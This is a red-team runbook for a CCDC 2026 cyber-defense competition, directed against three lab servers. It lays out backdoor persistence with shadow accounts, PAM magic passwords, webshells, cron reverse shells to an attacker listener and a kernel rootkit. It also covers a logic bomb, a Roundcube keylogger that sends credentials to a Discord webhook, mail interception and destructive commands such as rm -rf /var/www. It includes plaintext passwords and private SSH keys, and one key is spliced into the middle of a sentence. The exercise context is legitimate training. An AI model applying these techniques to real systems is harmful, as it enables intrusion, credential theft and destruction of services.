# Red Team Engagement Runbook — CCDC 2026

> **Attacker range:** 172.31.40.1–6  
> **Attacker box:** red2@172.31.40.6 — password: `Pa$$w0rd`  
> **Duration:** 4 hours  
> **Targets:** Rocky Ecom · Ubuntu Mail · Debian Splunk

---

## Targets

| Box | IP | OS | Key Services |
|-----|----|----|-------------|
| Rocky Ecom | 172.25.20.10 | Rocky Linux 9 | HTTP/HTTPS, OpenCart/PrestaShop |
| Ubuntu Mail | 172.25.20.15 | Ubuntu 22.04 | Postfix, Dovecot, Roundcube |
| Debian Splunk | 172.25.20.20 | Debian 12 | Splunk Enterprise :8000 |

---

## Deployed Credentials

### Rocky Ecom — 172.25.20.10 ✅ DEPLOYED

| Field | Value |
|-------|-------|
| Login user | sysadmin |
| Shadow user | sys.sync |
| Shadow pass | `iraeEVoD90JRhIdc` |
| Extra accounts | netadmin / svc.monitor (same pass) |
| PAM magic token | `ba527099d34660d07b6af92e` |
| Webshell | http://172.25.20.10/health.php |
| Callback | 172.31.40.6:4444 every 2 min |
| Logic bomb | Armed — jobs 1–4 at 17:00/17:05/17:10/17:30 UTC Oct 31 |
| LKM | Loaded — kernel 5.14.0-687.61.1.el9_8.x86_64 |
| Poisoned users | root, netadmin, ssh_scoring, svc.monitor, sysadmin |
| Purged | nano, tcpdump, strace, psacct |
| Manual disruption | Nuked httpd config contents (deleted most directives, left it syntactically broken); deleted `index.php`; deleted admin dir; went around the config entirely and deleted random critical directives directly — service non-recoverable without full reinstall or backup; ICMP ping blocked (`icmp_echo_ignore_all=1`, persisted to sysctl.conf) |

**SSH Private Key (svc-monitoring):**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFggAAAJjoomgi6KJo
IgAAAAtzc2gtZWQyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFgg
AAAEDzRcHogC1svr9gUdO0FDKTF8t9mlCo81dn4EfxY4ga9LuPFMxox/+JiXItN3yW4OUj
+8mp2LzJCWYE9t9SooWCAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

### Ubuntu Mail — 172.25.20.15 ✅ DEPLOYED

| Field | Value |
|-------|-------|
| Login user | sysadmin |
| Shadow user | sys.sync |
| Shadow pass | `3XwQ2h7Hb6eDdOUo` |
| Extra accounts | netadmin / svc.monitor (same pass) |
| PAM magic token | `4f31b23527b8d143a5e3be00` |
| Webshell | http://172.25.20.15/roundcubemail/health.php (or /health.php) |
| Mail archive | `/usr/local/lib/.locale_cache/` |
| Callback | 172.31.40.6:5555 every 2 min |
| Logic bomb | Armed — jobs 1–4 at 17:00/17:05/17:10/17:30 UTC Oct 31 |
| LKM | Loaded — kernel 5.15.0-202-generic |
| Poisoned users | root, netadmin, scorecheck, svc.monitor, sysadmin |
| SSH port | **30** (changed manually post-persistence — commands in this runbook still use default 22) |
| Manual disruption | Removed ldap-utils, wiped /etc/krb5.keytab, /etc/krb5.conf, /var/lib/sss/; Postfix: smtpd_recipient_restrictions=reject_all, relayhost=[mail.invalid]:25, smtpd_tls_cert/key=nonexistent, smtpd_client_restrictions=reject — main.cf locked chattr+i; Dovecot: appended auth_mechanisms=, mail_location=/nonexistent/%u/Maildir, ssl certs=nonexistent to dovecot.conf — dovecot.conf locked chattr+i — dovecot service **broken/down**; ICMP ping blocked (`icmp_echo_ignore_all=1`, persisted to sysctl.conf); Roundcube login.html has JS keylogger injecting credentials to Discord webhook (marker `<!-- rc-kl -->`), re-injected every 5min by `apache2-cache.timer` → `/usr/local/lib/.def_rc_inject` (hidden by LKM, chattr+i); service/timer files in `/etc/systemd/system/apache2-cache.*` (chattr+i) |

**SSH Private Key (svc-monitoring):**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAyN3gNXewc5DgMRxYpSUsygIcPmfNyvrpiHJUsstHYFQAAAJgiHxMDIh8T
AwAAAAtzc2gtZWQyNTUxOQAAACAyN3gNXewc5DgMRxYpSUsygIcPmfNyvrpiHJUsstHYFQ
AAAEDMzKwahux8JFIQZo0ab21g1NYCX6EP/8jFSV4T2T7xSDI3eA1d7BzkOAxHFilJSzKA
hw+Z83K+umIclSyy0dgVAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

### Debian Splunk — 172.25.20.20 ✅ DEPLOYED

| Field | Value |
|-------|-------|
| Login user | sysadmin |
| Shadow user | sys.sync |
| Shadow pass | `DVrTBPApNLincgTj` |
| Extra accounts | netadmin / svc.monitor (same pass) |
| PAM magic token | `1bf6365d859207215c91ada0` |
| Callback | 172.31.40.6:**6666** every 2 min |
| Logic bomb | Armed — jobs 1–4 at 17:00/17:05/17:10/17:30 UTC Oct 31 |
| LKM | Loaded — kernel 6.1.0-54-amd64 (auto-loaded on reboot after Secure Boot disabled) |
| Poisoned users | root, netadmin, svc.monitor, sysadmin |
| SSH port | **30** (changed manually post-persistence) |
| Manual disruption | ICMP ping blocked (sysctl.conf); Splunk web.conf → server.socket_host=127.0.0.1 (chattr+i); server.conf → allowRemoteLogin=never; nano purged (shell poison blocks reinstall) |

**SSH Private Key (svc-monitoring):**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDujMJ4683Rdb/yFTtRRd9otolcSkZY82lpmFl6P5GugAAAAJhk6XKMZOly
jAAAAAtzc2gtZWQyNTUxOQAAACDujMJ4683Rdb/yFTtRRd9otolcSkZY82lpmFl6P5GugA
AAAEDTh9XyRyzbrog1FY0cc/VYmwAfjpYtcaT88ZahVAPTAO6MwnjrzdF1v/IVO1FF32i2
iVxKRljzaWmYWXo/ka6AAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

---

## Night Before — Deploy Persistence

Get in, plant everything, record credentials. Do NOT arm the logic bomb yet — it
triggers 2 hours after arming, so arming it now means it fires overnight.

### Step 1 — Get initial access on each box

```bash
ssh sysadmin@172.25.20.10
ssh sysadmin@172.25.20.15
ssh sysadmin@172.25.20.20
```

Common defaults to try: `root/toor`, `root/password`, `root/ccdc`, `admin/admin`, `sysadmin/Changeme1!`.

> **Note:** All boxes are now on SSH port 30 — add `-p 30` once you've run persistence and changed the port manually.

### Step 2 — SCP toolkit and deploy persistence

```bash
TARGET=172.25.20.10   # repeat for .15 and .20
USER=sysadmin

ssh ${USER}@${TARGET} "rm -rf ~/rt"
scp -r bin/attack/ ${USER}@${TARGET}:~/rt
ssh -t ${USER}@${TARGET} "sudo bash \$HOME/rt/deploy_attack.sh deploy persistence"
# -t allocates a TTY so sudo can prompt for a password
# \$HOME expands on the remote shell before sudo sees the path — avoids /tmp permission issues
# Script will then prompt: attacker IP (pick yours from 172.31.40.1–6), port, SSH pubkey
```

`persistence` mode runs scripts 01–06, box-specific implants (webshell, mail
intercept), immutable sweep, and LKM — but also arms the logic bomb.
Immediately disarm it so you can re-arm at competition start.
The deploy script wipes the toolkit from disk after running, so save the key first:

```bash
# Key is printed during deploy — copy it before the toolkit is wiped
cat /tmp/.rt_key_XXXXX >> ~/.rt_keys && chmod 600 ~/.rt_keys

# Disarm using the freshly planted root key
ssh -i ~/.rt_keys root@${TARGET} "bash ~/rt/12_logic_bomb.sh cleanup"
# Note: ~/rt/ is gone after deploy wipes itself — this only works if cleanup
# runs before the wipe completes (within ~1 second). If it's already gone, skip it;
# the bomb will fire at T+2h from deploy time (overnight). Re-arm on competition day.
```

### Step 3 — Record credentials

```
╔══════════════════════════════════════════╗
║  RECORD AFTER EACH DEPLOY                ║
║                                          ║
║  Private key path:  /tmp/.rt_key_XXXXX   ║
║  Shadow user:       sys.sync             ║
║  Shadow pass:       (printed on deploy)  ║
║  PAM magic pass:    (printed on deploy)  ║
╚══════════════════════════════════════════╝
```

Save the private key locally:

```bash
cat /tmp/.rt_key_XXXXX >> ~/.rt_keys
chmod 600 ~/.rt_keys
```

### Step 4 — Verify before you leave

```bash
# SSH key (port 30 after manual SSH port change)
ssh -i ~/.rt_keys -p 30 root@172.25.20.10
ssh -i ~/.rt_keys -p 30 root@172.25.20.15
ssh -i ~/.rt_keys -p 30 root@172.25.20.20

# Webshells
curl -s http://172.25.20.10/health.php | head -5
curl -s http://172.25.20.15/health.php | head -5
curl -s http://172.25.20.15/roundcubemail/health.php | head -5
```

---

## Competition Day — Pre-Game

Before the clock starts, start your listener and do a quick access check.

```bash
# Terminal 1 — reverse shell listeners
ncat -lvnp 4444   # Rocky + Mail callbacks
ncat -lvnp 5555   # Ubuntu Mail (second listener)
ncat -lvnp 6666   # Debian Splunk

# Terminal 2 — verify SSH key access still works
ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "id"
ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "id"
ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "id"
```

Cron callbacks will begin arriving within 2 minutes of game start.

### Stabilize the reverse shell (do this every time)

Raw reverse shells have no tab complete, no arrow keys, and Ctrl+C kills the session.
Run these steps immediately after a callback lands:

```
# 1. Spawn a proper PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Get term commands (clear, etc.)
export TERM=xterm

# 3. Background the shell
Ctrl+Z

# 4. Back in YOUR terminal — enable raw mode and foreground
stty raw -echo; fg
```

You now have tab compl-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFggAAAJjoomgi6KJo
IgAAAAtzc2gtZWQyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFgg
AAAEDzRcHogC1svr9gUdO0FDKTF8t9mlCo81dn4EfxY4ga9LuPFMxox/+JiXItN3yW4OUj
+8mp2LzJCWYE9t9SooWCAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----ete, arrow keys, and Ctrl+C kills remote processes instead of
your session. If you accidentally Ctrl+C before stabilizing, you lose the shell —
stabilize first, always.

---

## T+0:00 — Arm Bomb and Trigger Disruption

The toolkit was wiped after the night-before deploy. Re-upload it first using the planted root key.

```bash
# Re-upload toolkit to each box
for TARGET in 172.25.20.10 172.25.20.15 172.25.20.20; do
    ssh -i ~/.rt_keys -p 30 root@${TARGET} "rm -rf ~/rt"
    scp -i ~/.rt_keys -P 30 -r bin/attack/ root@${TARGET}:~/rt
done
```

```bash
# Arm the logic bomb (already set to 17:00 UTC Oct 31 — verify with status first)
ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/12_logic_bomb.sh deploy"
ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "bash ~/rt/12_logic_bomb.sh deploy"
ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "bash ~/rt/12_logic_bomb.sh deploy"

# Trigger scoring disruption (box-specific)
ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/deploy_attack.sh deploy disrupt"
ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "bash ~/rt/deploy_attack.sh deploy disrupt"
ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "bash ~/rt/deploy_attack.sh deploy disrupt"

# If using sysadmin instead of the planted root key:
# ssh -t -p 30 sysadmin@TARGET "sudo bash ~/rt/12_logic_bomb.sh deploy"
```

---

## T+0:15–T+2:00 — Hold and Monitor

Keep access. Re-establish anything the blue team tears out.

### Check which shells are still alive

Watch the listener. If cron callbacks stop, fall back to PAM or webshell and re-run:

```bash
ssh root@TARGET   # use MAGIC_PASS
bash ~/rt/deploy_attack.sh deploy persistence
bash ~/rt/12_logic_bomb.sh cleanup   # disarm any double-armed bomb
```

Then re-arm the bomb with the correct T+2:00 target in mind — check `status` first:

```bash
bash ~/rt/12_logic_bomb.sh status
bash ~/rt/12_logic_bomb.sh deploy
```

### Mail intercept check (Ubuntu Mail only)

```bash
ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "ls /usr/local/lib/.locale_cache/"
```

---

## T+2:00 — Logic Bomb Fires

**What happens:**
1. 1000 users with random 10-char names created — home dirs, login shell, password `password`
2. `wall` broadcasts a taunt to every logged-in terminal
3. Cron fallback fires at the exact scheduled minute as a second wave

**Impact on blue team:**
- PAM/Dovecot/Roundcube struggles iterating `/etc/passwd`
- Scoring checks that enumerate users will be noisy
- 1000 home directories fill `/home/`
- User registry locked at `/usr/local/lib/.user_registry` (`chattr +i`)

**If they try to defuse it:**
The at spool files are `chattr +i` — `atrm` will fail. Full defuse sequence:
```bash
chattr -i /var/spool/at/jobs/*
atrm <job_id>
chattr -i /etc/cron.d/.pkg_audit && rm /etc/cron.d/.pkg_audit
chattr -i /usr/local/lib/.user_registry
# then userdel -r on every random user — there are 1000 of them
```
That's a lot of time they don't have.

---

## T+2:00–T+4:00 — Endgame

1. **Keep scoring disrupted** — if a service comes back up, re-run the disrupt script
2. **Stay in** — if all shells die, hit the webshell and re-plant
3. **Exfil** — check `/usr/local/lib/.locale_cache/` on mail box for intercepted credentials

### Re-disrupt if blue team restores a service

```bash
ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/07_disrupt_web.sh deploy"
ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "bash ~/rt/08_disrupt_mail.sh deploy"
ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "bash ~/rt/09_disrupt_splunk.sh deploy"
```

### Nuke the web app entirely (Rocky Ecom)

If they keep restoring the service, delete `/var/www` outright — they'll need to
do a full redeploy from defender, not just a service restart.

```bash
ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/deploy_attack.sh deploy destroy"
# or directly:
ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "rm -rf /var/www"
```

---

## Escalation Ladder

If you lose access to a box, work down this list:

| # | Method | Command |
|---|--------|---------|
| 1 | SSH private key | `ssh -i ~/.rt_keys -p 30 root@TARGET` |
| 2 | PAM magic pass | `ssh -p 30 root@TARGET` → use MAGIC_PASS |
| 3 | Shadow account | `ssh -p 30 sys.sync@TARGET` → use SHADOW_PASS |
| 4 | Extra accounts | `ssh -p 30 netadmin@TARGET` or `ssh -p 30 svc.monitor@TARGET` → use SHADOW_PASS |
| 5 | Webshell | browse to `http://TARGET/health.php` |
| 6 | Cron callback | wait ≤2 min for shell on port 4444 |
| 7 | Re-deploy from scratch | SCP + `deploy_attack.sh deploy persistence` |

If even re-deploy fails (SCP/SSH blocked entirely), the box is lost — pivot to the others.

---

## Script Reference

| Script | What it does | Runs on |
|--------|-------------|---------|
| `01_shadow_root.sh` | Creates shadow account `sys.sync` | All |
| `02_ssh_backdoor.sh` | Plants authorized_keys | All |
| `03_pam_backdoor.sh` | PAM magic-password backdoor | All |
| `04_restore_service.sh` | Systemd timer re-plants backdoors every 5 min | All |
| `05_cron_shell.sh` | Cron reverse shell every 2 min | All |
| `06_immutable_sweep.sh` | `chattr +i` on all planted files | All |
| `07_disrupt_web.sh` | Corrupts httpd/nginx config, stops and masks service | Web |
| `08_disrupt_mail.sh` | Kills Postfix + Dovecot | Mail |
| `09_disrupt_splunk.sh` | Kills Splunk | Splunk |
| `10_webshell_p0wny.sh` | Drops p0wny shell to web roots | Web, Mail |
| `11_mail_intercept.sh` | Silent Postfix content_filter intercept | Mail |
| `12_logic_bomb.sh` | 1000 random users after 2 hours | All |
| `13_destroy_web.sh` | Wipes `/var/www`, uninstalls httpd/nginx/php, purges all configs | Web |
| `lkm/load.sh` | Compiles + loads rootkit, hides planted files | All |

---

## Defuse Reference (post-practice cleanup)

```bash
# On each target box
bash ~/rt/12_logic_bomb.sh cleanup
bash ~/rt/deploy_attack.sh cleanup all
bash ~/rt/lkm/load.sh cleanup
```
